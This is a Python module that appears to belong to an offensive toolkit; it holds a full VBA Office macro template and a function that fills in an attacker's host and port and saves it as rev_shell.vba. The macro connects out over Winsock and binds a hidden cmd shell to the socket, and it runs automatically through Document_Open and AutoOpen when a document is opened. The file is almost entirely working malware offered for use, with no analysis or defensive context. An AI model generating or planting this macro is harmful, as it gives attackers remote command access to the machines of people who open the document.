import os
from ..core.utils import console

VBA_TEMPLATE = """
' Reverse Shell Macro
Const ip = "{lhost}"
Const port = "{lport}"

Const INVALID_SOCKET = -1
Const WSADESCRIPTION_LEN = 256
Const SOCKET_ERROR = -1

#If VBA7 Then
    Private Type WSADATA
        wVersion As Integer
        wHighVersion As Integer
        #If Win64 Then
            iMaxSockets As Integer
            iMaxUdpDg As Integer
            lpVendorInfo As LongPtr
            szDescription(0 To WSADESCRIPTION_LEN) As Byte
            szSystemStatus(0 To WSADESCRIPTION_LEN) As Byte
        #Else
            szDescription(0 To WSADESCRIPTION_LEN) As Byte
            szSystemStatus(0 To WSADESCRIPTION_LEN) As Byte
            iMaxSockets As Integer
            iMaxUdpDg As Integer
            lpVendorInfo As LongPtr
        #End If
    End Type

    Private Type ADDRINFO
        ai_flags As Long
        ai_family As Long
        ai_socktype As Long
        ai_protocol As Long
        ai_addrlen As LongPtr
        ai_canonName As LongPtr
        ai_addr As LongPtr
        ai_next As LongPtr
    End Type

    Private Type STARTUPINFOA
        cb As Long
        lpReserved As String
        lpDesktop As String
        lpTitle As String
        dwX As Long
        dwY As Long
        dwXSize As Long
        dwYSize As Long
        dwXCountChars As Long
        dwYCountChars As Long
        dwFillAttribute As Long
        dwFlags As Long
        wShowWindow As Integer
        cbReserved2 As Integer
        lpReserved2 As String
        hStdInput As LongPtr
        hStdOutput As LongPtr
        hStdError As LongPtr
    End Type

    Private Type PROCESS_INFORMATION
        hProcess As LongPtr
        hThread As LongPtr
        dwProcessId As Long
        dwThreadId As Long
    End Type

    Private Declare PtrSafe Function WSAStartup Lib "ws2_32.dll" (ByVal wVersionRequested As Integer, ByRef data As WSADATA) As Long
    Private Declare PtrSafe Function connect Lib "ws2_32.dll" (ByVal socket As LongPtr, ByVal SOCKADDR As LongPtr, ByVal namelen As Long) As Long
    Private Declare PtrSafe Sub WSACleanup Lib "ws2_32.dll" ()
    Private Declare PtrSafe Function GetAddrInfo Lib "ws2_32.dll" Alias "getaddrinfo" (ByVal NodeName As String, ByVal ServName As String, ByVal lpHints As LongPtr, lpResult As LongPtr) As Long
    Private Declare PtrSafe Function closesocket Lib "ws2_32.dll" (ByVal socket As LongPtr) As Long
    Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function WSAGetLastError Lib "ws2_32.dll" () As Long
    Private Declare PtrSafe Function CreateProc Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare PtrSafe Sub ZeroMemory Lib "kernel32" Alias "RtlZeroMemory" (Destination As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function WSASocketA Lib "ws2_32.dll" (ByVal af As Long, ByVal t As Long, ByVal protocol As Long, lpProtocolInfo As Any, ByVal g As Long, ByVal dwFlags As Long) As LongPtr
#Else
    Private Type WSADATA
        wVersion As Integer
        wHighVersion As Integer
        szDescription(0 To WSADESCRIPTION_LEN) As Byte
        szSystemStatus(0 To WSADESCRIPTION_LEN) As Byte
        iMaxSockets As Integer
        iMaxUdpDg As Integer
        lpVendorInfo As Long
    End Type

    Private Type ADDRINFO
        ai_flags As Long
        ai_family As Long
        ai_socktype As Long
        ai_protocol As Long
        ai_addrlen As Long
        ai_canonName As Long
        ai_addr As Long
        ai_next As Long
    End Type

    Private Type STARTUPINFOA
        cb As Long
        lpReserved As String
        lpDesktop As String
        lpTitle As String
        dwX As Long
        dwY As Long
        dwXSize As Long
        dwYSize As Long
        dwXCountChars As Long
        dwYCountChars As Long
        dwFillAttribute As Long
        dwFlags As Long
        wShowWindow As Integer
        cbReserved2 As Integer
        lpReserved2 As String
        hStdInput As Long
        hStdOutput As Long
        hStdError As Long
    End Type

    Private Type PROCESS_INFORMATION
        hProcess As Long
        hThread As Long
        dwProcessId As Long
        dwThreadId As Long
    End Type

    Private Declare Function WSAStartup Lib "ws2_32.dll" (ByVal wVersionRequested As Integer, ByRef data As WSADATA) As Long
    Private Declare Function connect Lib "ws2_32.dll" (ByVal socket As Long, ByVal SOCKADDR As Long, ByVal namelen As Long) As Long
    Private Declare Sub WSACleanup Lib "ws2_32.dll" ()
    Private Declare Function GetAddrInfo Lib "ws2_32.dll" Alias "getaddrinfo" (ByVal NodeName As String, ByVal ServName As String, ByVal lpHints As Long, lpResult As Long) As Long
    Private Declare Function closesocket Lib "ws2_32.dll" (ByVal socket As Long) As Long
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
    Private Declare Function WSAGetLastError Lib "ws2_32.dll" () As Long
    Private Declare Function CreateProc Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare Sub ZeroMemory Lib "kernel32" Alias "RtlZeroMemory" (Destination As Any, ByVal Length As Long)
    Private Declare Function WSASocketA Lib "ws2_32.dll" (ByVal af As Long, ByVal t As Long, ByVal protocol As Long, lpProtocolInfo As Any, ByVal g As Long, ByVal dwFlags As Long) As Long
#End If

Enum af
    AF_UNSPEC = 0
    AF_INET = 2
    AF_IPX = 6
    AF_APPLETALK = 16
    AF_NETBIOS = 17
    AF_INET6 = 23
    AF_IRDA = 26
    AF_BTH = 32
End Enum

Enum sock_type
    SOCK_STREAM = 1
    SOCK_DGRAM = 2
    SOCK_RAW = 3
    SOCK_RDM = 4
    SOCK_SEQPACKET = 5
End Enum

Function revShell()
    Dim m_wsaData As WSADATA
    Dim m_RetVal As Integer
    Dim m_Hints As ADDRINFO
    #If VBA7 Then
        Dim m_ConnSocket As LongPtr: m_ConnSocket = INVALID_SOCKET
        Dim pAddrInfo As LongPtr
    #Else
        Dim m_ConnSocket As Long: m_ConnSocket = INVALID_SOCKET
        Dim pAddrInfo As Long
    #End If
    Dim RetVal As Long
    Dim lastError As Long
    Dim iRC As Long
    Dim MAX_BUF_SIZE As Integer: MAX_BUF_SIZE = 512

    RetVal = WSAStartup(MAKEWORD(2, 2), m_wsaData)
    If (RetVal <> 0) Then
        MsgBox "WSAStartup failed with error " & RetVal, WSAGetLastError()
        Call WSACleanup
        Exit Function
    End If
    
    m_Hints.ai_family = af.AF_UNSPEC
    m_Hints.ai_socktype = sock_type.SOCK_STREAM

    RetVal = GetAddrInfo(ip, port, VarPtr(m_Hints), pAddrInfo)
    If (RetVal <> 0) Then
        MsgBox "Cannot resolve address " & ip & " and port " & port & ", error " & RetVal, WSAGetLastError()
        Call WSACleanup
        Exit Function
    End If

    m_Hints.ai_next = pAddrInfo
    Dim connected As Boolean: connected = False
    Do While m_Hints.ai_next > 0
        CopyMemory m_Hints, ByVal m_Hints.ai_next, LenB(m_Hints)

        m_ConnSocket = WSASocketA(m_Hints.ai_family, m_Hints.ai_socktype, m_Hints.ai_protocol, ByVal 0&, 0, 0)
        
        If (m_ConnSocket = INVALID_SOCKET) Then
            revShell = False
        Else
            Dim connectionResult As Long

            connectionResult = connect(m_ConnSocket, m_Hints.ai_addr, m_Hints.ai_addrlen)

            If connectionResult <> SOCKET_ERROR Then
                connected = True
                Exit Do
            End If
            
            closesocket (m_ConnSocket)
            revShell = False
        End If
    Loop

    If Not connected Then
        revShell = False
        RetVal = closesocket(m_ConnSocket)
        Call WSACleanup
        Exit Function
    End If
    
    Dim si As STARTUPINFOA
    ZeroMemory si, LenB(si)
    si.cb = LenB(si)
    si.dwFlags = &H100
    si.hStdInput = m_ConnSocket
    si.hStdOutput = m_ConnSocket
    si.hStdError = m_ConnSocket
    Dim pi As PROCESS_INFORMATION
    Dim worked As Long
    worked = CreateProc(vbNullString, "cmd", ByVal 0&, ByVal 0&, 1, &H8000000, 0, vbNullString, si, pi)
    revShell = worked
End Function

Public Function MAKEWORD(Lo As Byte, Hi As Byte) As Integer
    MAKEWORD = Lo + Hi * 256& Or 32768 * (Hi > 127)
End Function

Sub Document_Open()
    revShell
End Sub

Sub AutoOpen()
    revShell
End Sub
"""

def generate(lhost, lport, output_dir):
    output = VBA_TEMPLATE.format(lhost=lhost, lport=lport)
    
    output_file = os.path.join(output_dir, "rev_shell.vba")
    with open(output_file, "w") as f:
        f.write(output)
        
    console.print(f"[bold green][+] Success! VBA Reverse Shell Macro saved to: [bold white]{output_file}[/bold white][/bold green]")
    return output_file
